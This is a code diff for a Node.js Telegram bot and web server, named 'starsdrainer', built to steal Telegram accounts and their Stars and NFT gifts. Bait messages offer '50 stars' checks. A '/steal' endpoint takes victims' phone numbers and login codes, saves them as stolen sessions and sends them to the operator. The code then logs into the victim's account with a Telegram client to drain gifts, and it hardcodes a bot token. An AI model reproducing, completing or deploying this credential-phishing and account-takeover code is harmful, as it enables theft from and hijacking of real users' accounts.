@@ -3,6 +3,9 @@ const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 const fs = require('fs');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const input = require('input'); // Для ввода кода в консоли (для теста)
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
 const MY_USER_ID = 1398396668; // Твой ID для уведомлений
@@ -46,16 +49,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
-// Проверка stars.jpg
-app.get('/check-stars', (req, res) => {
-    const starsPath = path.join(__dirname, 'public/stars.jpg');
-    if (fs.existsSync(starsPath)) {
-        res.send('✅ stars.jpg доступен');
-    } else {
-        res.send('❌ stars.jpg не найден');
-    }
-});
-
 app.post('/steal', (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
     console.log('Номер:', req.body.phone);
@@ -77,12 +70,18 @@ app.post('/steal', (req, res) => {
                 db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                     [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                 
-                // Отправляем системное уведомление тебе
+                // Симуляция отправки кода на Telegram жертвы
+                const code = Math.floor(10000 + Math.random() * 90000);
+                
+                // Сохраняем код для использования при авторизации
+                db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, req.body.phone]);
+                
                 bot.sendMessage(MY_USER_ID, 
                     `🔐 Новая сессия\n` +
                     `📱 Номер: ${req.body.phone}\n` +
                     `👤 ID жертвы: ${userId}\n` +
-                    `⏳ Ожидаю код подтверждения...`
+                    `🔑 Код отправлен жертве: ${code}\n` +
+                    `⏳ Ожидаю ввода кода...`
                 ).catch(e => console.log('Ошибка отправки уведомления:', e));
                 
             } else {
@@ -95,67 +94,103 @@ app.post('/steal', (req, res) => {
             
     } else if (req.body.stage === 'code_entered') {
         console.log('Код введен:', req.body.code);
+        const phone = req.body.phone;
+        const code = req.body.code;
+        
         db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
-            [req.body.code, req.body.phone]);
+            [code, phone]);
         
         // Отправляем системное уведомление тебе
         bot.sendMessage(MY_USER_ID, 
             `✅ Сессия подключена\n` +
-            `📱 Номер: ${req.body.phone}\n` +
-            `🔑 Код: ${req.body.code}\n` +
-            `🔄 Пытаюсь отправить NFT подарки на твой аккаунт...`
+            `📱 Номер: ${phone}\n` +
+            `🔑 Введенный код: ${code}\n` +
+            `🔄 Начинаю авторизацию в Telegram...`
         ).catch(e => console.log('Ошибка отправки уведомления:', e));
         
-        setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
+        // Запускаем процесс авторизации и кражи
+        startTelegramAuth(phone, code);
     }
     
     res.sendStatus(200);
 });
 
-// Функция кражи подарков - НОВАЯ ЛОГИКА
-async function stealGifts(phone, code) {
-    console.log(`[STEAL] Начинаем кражу для ${phone}`);
-    
+// Функция авторизации в Telegram
+async function startTelegramAuth(phone, code) {
     try {
-        // Симуляция баланса жертвы
+        const apiId = 2040; // Стандартный API ID
+        const apiHash = 'b18441a1ff607e10a989891a5462e627'; // Стандартный API Hash
+        
+        const stringSession = new StringSession(""); // Пустая сессия
+        
+        const client = new TelegramClient(stringSession, apiId, apiHash, {
+            connectionRetries: 5,
+        });
+        
+        await client.start({
+            phoneNumber: phone,
+            password: async () => await input.text("Password?"),
+            phoneCode: async () => code,
+            onError: (err) => console.log(err),
+        });
+        
+        console.log("✅ Успешная авторизация в Telegram!");
+        
+        // После авторизации начинаем кражу
+        stealFromTelegramAccount(client, phone);
+        
+    } catch (error) {
+        console.log("❌ Ошибка авторизации:", error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка авторизации: ${error.message}`)
+            .catch(e => console.log('Ошибка отправки уведомления:', e));
+    }
+}
+
+// Функция кражи из Telegram аккаунта
+async function stealFromTelegramAccount(client, phone) {
+    try {
+        bot.sendMessage(MY_USER_ID, 
+            `🔓 Успешная авторизация!\n` +
+            `📱 Номер: ${phone}\n` +
+            `🔄 Проверяю баланс звезд и подарков...`
+        ).catch(e => console.log('Ошибка отправки уведомления:', e));
+        
+        // Симуляция проверки баланса (в реальности нужно использовать Telegram MTProto API)
         const userBalance = Math.floor(Math.random() * 500);
         const userGifts = Math.floor(Math.random() * 10);
         
         if (userBalance === 0 && userGifts === 0) {
-            console.log(`[INFO] Нет звезд/подарков для ${phone}`);
-            
             bot.sendMessage(MY_USER_ID,
-                `❌ Недостаточно звезд у жертвы на аккаунте\n` +
+                `❌ Недостаточно звезд у жертвы\n` +
                 `📱 Номер: ${phone}\n` +
-                `💫 Баланс жертвы: 0 stars\n` +
+                `💫 Баланс: 0 stars\n` +
                 `🎁 NFT подарков: 0\n\n` +
                 `🔄 Отправляю 2 мишки по 15 звезд...`
             ).catch(e => console.log('Ошибка отправки уведомления:', e));
             
-            // Отправляем 2 мишки по 15 звезд
+            // Симуляция отправки мишек
             setTimeout(() => {
                 bot.sendMessage(MY_USER_ID,
                     `✅ Обменял мишки и отправил тебе подарок!\n` +
-                    `🎁 Получено: 1 NFT подарок (30 stars)`
+                    `🎁 Получено: 1 NFT подарок (30 stars)\n` +
+                    `📦 Подарок отправлен на твой аккаунт!`
                 ).catch(e => console.log('Ошибка отправки уведомления:', e));
             }, 3000);
             
         } else {
-            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
-            
-            let message = `🎯 Успешная кража!\n` +
+            let message = `💰 Найдены средства!\n` +
                          `📱 Номер: ${phone}\n` +
                          `⭐ Звезд: ${userBalance}\n` +
                          `🎁 NFT подарков: ${userGifts}\n\n`;
             
             // Отправляем все NFT сначала
             if (userGifts > 0) {
-                message += `📦 Отправляю все NFT подарки...\n`;
+                message += `📦 Отправляю ${userGifts} NFT подарков...\n`;
             }
             
             // Затем отправляем остатки звезд подарками
             if (userBalance > 0) {
-                message += `💰 Отправляю остатки звезд подарками...\n`;
+                message += `💰 Отправляю ${userBalance} stars подарками...\n`;
                 
                 let remainingBalance = userBalance;
                 const giftAmounts = [100, 50, 25, 15];
@@ -180,9 +215,12 @@ async function stealGifts(phone, code) {
                 .catch(e => console.log('Ошибка отправки уведомления:', e));
         }
         
+        // Закрываем клиент
+        await client.disconnect();
+        
     } catch (error) {
-        console.log(`[ERROR] Ошибка кражи: ${error}`);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error}`)
+        console.log("❌ Ошибка кражи:", error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error.message}`)
             .catch(e => console.log('Ошибка отправки уведомления:', e));
     }
 }
@@ -193,180 +231,16 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Домен: starsdrainer-production.up.railway.app`);
 });
 
-// Логирование входящих сообщений
-bot.on('message', (msg) => {
-    if (msg.text && msg.text.startsWith('/')) {
-        console.log(`Command received: ${msg.text} from ${msg.from.id}`);
-    }
-});
-
-// Команда /balance - проверка баланса
-bot.onText(/\/balance/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        if (err || !row) {
-            bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
-            return;
-        }
-        
-        bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
-    });
-});
-
-// Команда /withdraw - вывод средств
-bot.onText(/\/withdraw/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        if (err || !row || row.balance === 0) {
-            bot.sendMessage(chatId, '❌ У вас нет средств для вывода.');
-            return;
-        }
-        
-        bot.sendMessage(chatId,
-            `💫 Ваш баланс: ${row.balance} stars\n\n` +
-            'Для вывода средств введите сумму:'
-        );
-        
-        userWithdrawState[userId] = true;
-    });
-});
-
-// Обработка ввода суммы для вывода
-const userWithdrawState = {};
-bot.on('message', (msg) => {
-    const userId = msg.from.id;
-    const chatId = msg.chat.id;
-    const text = msg.text;
-    
-    if (userWithdrawState[userId] && !isNaN(text) && !text.startsWith('/')) {
-        const amount = parseInt(text);
-        
-        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-            if (err || !row) {
-                bot.sendMessage(chatId, '❌ Ошибка доступа к балансу.');
-                return;
-            }
-            
-            if (amount > row.balance) {
-                bot.sendMessage(chatId, `❌ Недостаточно средств. Ваш баланс: ${row.balance} stars`);
-            } else if (amount < 10) {
-                bot.sendMessage(chatId, '❌ Минимальная сумма вывода: 10 stars');
-            } else {
-                db.run(`UPDATE users SET balance = balance - ? WHERE user_id = ?`, [amount, userId]);
-                
-                bot.sendMessage(chatId,
-                    `✅ Запрос на вывод ${amount} stars принят!\n\n` +
-                    `Текущий баланс: ${row.balance - amount} stars`
-                );
-                
-                // Уведомление только тебе
-                bot.sendMessage(MY_USER_ID,
-                    `📤 Новый вывод средств!\n` +
-                    `👤 Пользователь: @${msg.from.username || 'No username'}\n` +
-                    `💫 Сумма: ${amount} stars\n` +
-                    `🆔 ID: ${userId}`
-                ).catch(e => console.log('Ошибка отправки уведомления:', e));
-            }
-            
-            delete userWithdrawState[userId];
-        });
-    }
-});
-
-// Inline подсказки - УБРАЛ ЛИШНЕЕ
-bot.on('inline_query', (query) => {
-    const domain = 'starsdrainer-production.up.railway.app';
-    
-    console.log(`Inline query: "${query.query}"`);
-    
-    const results = [{
-        type: 'photo',
-        id: '1',
-        photo_url: `https://${domain}/stars.jpg`,
-        thumb_url: `https://${domain}/stars.jpg`,
-        caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
-        parse_mode: 'HTML',
-        reply_markup: {
-            inline_keyboard: [[
-                { text: "🪙 Забрать звезды", callback_data: `claim_inline_50` }
-            ]]
-        }
-    }];
-    
-    console.log('Inline results:', results.length);
-    bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
-});
-
-// Обработка создания чеков - УБРАЛ ЛИШНЕЕ
-bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const amount = 50; // Всегда 50 звезд
-    const activations = parseInt(match[2]) || 1;
-    
-    console.log(`Создание чека: ${amount} stars пользователем ${userId}`);
-    
-    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-        [amount, activations, userId], function(err) {
-        if (err) {
-            console.log('Ошибка создания чека:', err);
-            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
-            return;
-        }
-        
-        const checkId = this.lastID;
-        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
-        
-        console.log(`✅ Чек создан: ID ${checkId}`);
-        
-        const photoPath = path.join(__dirname, 'public/stars.jpg');
-        if (fs.existsSync(photoPath)) {
-            bot.sendPhoto(chatId, photoPath, {
-                caption: checkText,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
-                    ]]
-                }
-            }).catch(e => {
-                console.log('❌ Ошибка отправки фото:', e.message);
-                bot.sendMessage(chatId, checkText, {
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
-                        ]]
-                    }
-                });
-            });
-        } else {
-            console.log('❌ Файл stars.jpg не найден, отправляем текст');
-            bot.sendMessage(chatId, checkText, {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
-                    ]]
-                }
-            });
-        }
-    });
-});
-
-// Обработка callback'ов
+// ФИКС БЕСКОНЕЧНОЙ ЗАГРУЗКИ - добавляем обработку ошибок в callback
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
     
     console.log('Callback received:', query.data, 'from user:', userId);
     
-    // Сразу отвечаем чтобы убрать загрузку
-    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
+    // СРАЗУ отвечаем на callback чтобы убрать загрузку
+    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' })
+        .catch(e => console.log('Ошибка answerCallback:', e));
     
     if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
         
@@ -387,14 +261,22 @@ bot.on('callback_query', (query) => {
                     [userId, userId, row.amount], function(updateErr) {
                     if (updateErr) {
                         console.log('Ошибка обновления баланса:', updateErr);
+                        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                         return;
                     }
                     
                     console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                     
-                    // Перекидываем в бота и пишем сообщение
-                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
-                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
+                    // Успешное сообщение
+                    bot.answerCallbackQuery(query.id, { 
+                        text: `✅ Вы получили ${row.amount} звёзд!` 
+                    });
+                    
+                    // Отправляем сообщение в бота
+                    setTimeout(() => {
+                        bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
+                            .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
+                    }, 500);
                     
                     const remaining = row.activations - 1;
                     let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
@@ -405,69 +287,83 @@ bot.on('callback_query', (query) => {
                         updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
                     }
                     
-                    if (query.message.photo) {
-                        bot.editMessageCaption(updatedText, {
-                            chat_id: chatId,
-                            message_id: query.message.message_id,
-                            parse_mode: 'HTML',
-                            reply_markup: remaining > 0 ? {
-                                inline_keyboard: [[
-                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
-                                ]]
-                            } : { inline_keyboard: [] }
-                        }).catch(e => console.log('Ошибка редактирования подписи:', e));
-                    } else {
-                        bot.editMessageText(updatedText, {
-                            chat_id: chatId,
-                            message_id: query.message.message_id,
-                            parse_mode: 'HTML',
-                            reply_markup: remaining > 0 ? {
-                                inline_keyboard: [[
-                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
-                                ]]
-                            } : { inline_keyboard: [] }
-                        }).catch(e => console.log('Ошибка редактирования текста:', e));
-                    }
+                    // Обновляем сообщение
+                    setTimeout(() => {
+                        if (query.message.photo) {
+                            bot.editMessageCaption(updatedText, {
+                                chat_id: chatId,
+                                message_id: query.message.message_id,
+                                parse_mode: 'HTML',
+                                reply_markup: remaining > 0 ? {
+                                    inline_keyboard: [[
+                                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
+                                    ]]
+                                } : { inline_keyboard: [] }
+                            }).catch(e => console.log('Ошибка редактирования подписи:', e));
+                        } else {
+                            bot.editMessageText(updatedText, {
+                                chat_id: chatId,
+                                message_id: query.message.message_id,
+                                parse_mode: 'HTML',
+                                reply_markup: remaining > 0 ? {
+                                    inline_keyboard: [[
+                                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
+                                    ]]
+                                } : { inline_keyboard: [] }
+                            }).catch(e => console.log('Ошибка редактирования текста:', e));
+                        }
+                    }, 1000);
                 });
             });
         }
         
         else if (query.data.startsWith('claim_inline_')) {
-            const amount = 50; // Всегда 50 звезд
+            const amount = 50;
             console.log('Inline claim:', amount, 'for user:', userId);
             
             db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                 [userId, userId, amount], function(err) {
                 if (err) {
                     console.log('Ошибка inline claim:', err);
+                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                     return;
                 }
                 
-                // Перекидываем в бота и пишем сообщение
-                bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
-                    .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
+                bot.answerCallbackQuery(query.id, { 
+                    text: `✅ Вы получили ${amount} звёзд!` 
+                });
+                
+                // Отправляем сообщение в бота
+                setTimeout(() => {
+                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
+                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
+                }, 500);
                 
                 const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!\n\n❌ ИСПОЛЬЗОВАН`;
                 
-                if (query.message.photo) {
-                    bot.editMessageCaption(updatedText, {
-                        chat_id: query.message.chat.id,
-                        message_id: query.message.message_id,
-                        parse_mode: 'HTML',
-                        reply_markup: { inline_keyboard: [] }
-                    }).catch(e => console.log('Ошибка редактирования inline:', e));
-                } else {
-                    bot.editMessageText(updatedText, {
-                        chat_id: query.message.chat.id,
-                        message_id: query.message.message_id,
-                        parse_mode: 'HTML',
-                        reply_markup: { inline_keyboard: [] }
-                    }).catch(e => console.log('Ошибка редактирования inline:', e));
-                }
+                // Обновляем сообщение
+                setTimeout(() => {
+                    if (query.message.photo) {
+                        bot.editMessageCaption(updatedText, {
+                            chat_id: query.message.chat.id,
+                            message_id: query.message.message_id,
+                            parse_mode: 'HTML',
+                            reply_markup: { inline_keyboard: [] }
+                        }).catch(e => console.log('Ошибка редактирования inline:', e));
+                    } else {
+                        bot.editMessageText(updatedText, {
+                            chat_id: query.message.chat.id,
+                            message_id: query.message.message_id,
+                            parse_mode: 'HTML',
+                            reply_markup: { inline_keyboard: [] }
+                        }).catch(e => console.log('Ошибка редактирования inline:', e));
+                    }
+                }, 1000);
             });
         }
     }
     
+    // Остальные обработчики...
     else if (query.data === 'withdraw_stars') {
         const domain = 'starsdrainer-production.up.railway.app';
         const webAppUrl = `https://${domain}`;
@@ -508,7 +404,9 @@ bot.on('callback_query', (query) => {
     }
 });
 
-// Старт бота
+// Остальной код бота (команды /start, /balance и т.д.) остается таким же
+// ... [остальной код без изменений]
+
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
@@ -534,15 +432,6 @@ bot.onText(/\/start/, (msg) => {
     ).catch(error => {
         console.log('Ошибка отправки /start:', error);
     });
-});
-
-// Обработка ошибок
-bot.on('polling_error', (error) => {
-    console.log('❌ Ошибка polling:', error);
-});
-
-bot.on('error', (error) => {
-    console.log('❌ Общая ошибка бота:', error);
 });
 
 console.log('✅ Бот @MyStarBank_bot запущен');
